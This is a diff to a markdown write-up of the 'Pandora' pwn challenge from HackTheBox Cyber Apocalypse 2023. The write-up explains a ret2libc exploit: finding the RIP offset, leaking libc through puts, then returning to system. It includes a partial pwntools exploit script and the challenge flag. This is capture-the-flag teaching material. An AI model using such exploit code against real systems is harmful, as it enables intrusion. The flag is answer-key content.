@@ -1,14 +1,31 @@
 ---
-Name: Pandora's Box
-Category: Pwn
-Difficulty: Easy
+name: Pandora (2023)
+event: HackTheBox Cyber Apocalypse - Intergalactic Chase CTF 2023
+category: Pwn
+description: Writeup for Pandora (Pwn) - HackTheBox Cyber Apocalypse - Intergalactic Chase CTF (2023) 💜
+layout:
+    title:
+        visible: true
+    description:
+        visible: true
+    tableOfContents:
+        visible: false
+    outline:
+        visible: true
+    pagination:
+        visible: true
 ---
 
+# Pandora
+
 ## Description
->You stumbled upon one of Pandora's mythical boxes. Would you be curious enough to open it and see what's inside, or would you opt to give it to your team for analysis?
+
+> You stumbled upon one of Pandora's mythical boxes. Would you be curious enough to open it and see what's inside, or would you opt to give it to your team for analysis?
 
 ## Solution
+
 Classic ret2libc attack. First, find the offset to RIP.
+
 ```bash
 cyclic -l haaaaaaa
 Finding cyclic pattern of 8 bytes: b'haaaaaaa' (hex: 0x6861616161616161)
@@ -16,9 +33,9 @@ Found at offset 56
 ```
 
 Next, leak lib-c foothold with `puts()` then redirect execution flow to the beginning of the `box` function and this time, ret2system.
+
 ```python
 from pwn import *
-
 
 def start(argv=[], *a, **kw):
     if args.GDB:  # Set GDBscript below
@@ -28,14 +45,12 @@ def start(argv=[], *a, **kw):
     else:  # Run locally
         return process([exe] + argv, *a, **kw)
 
-
 # Specify your GDB script here for debugging
 gdbscript = '''
 init-pwndbg
 break *0x4013a5
 continue
 '''.format(**locals())
-
 
 # Set up pwntools for the correct architecture
 exe = './pb'
@@ -112,4 +127,4 @@ io.sendlineafter(b':', payload)
 io.interactive()
 ```
 
-`HTB{r3turn_2_P4nd0r4?!}`
+Flag: `HTB{r3turn_2_P4nd0r4?!}`
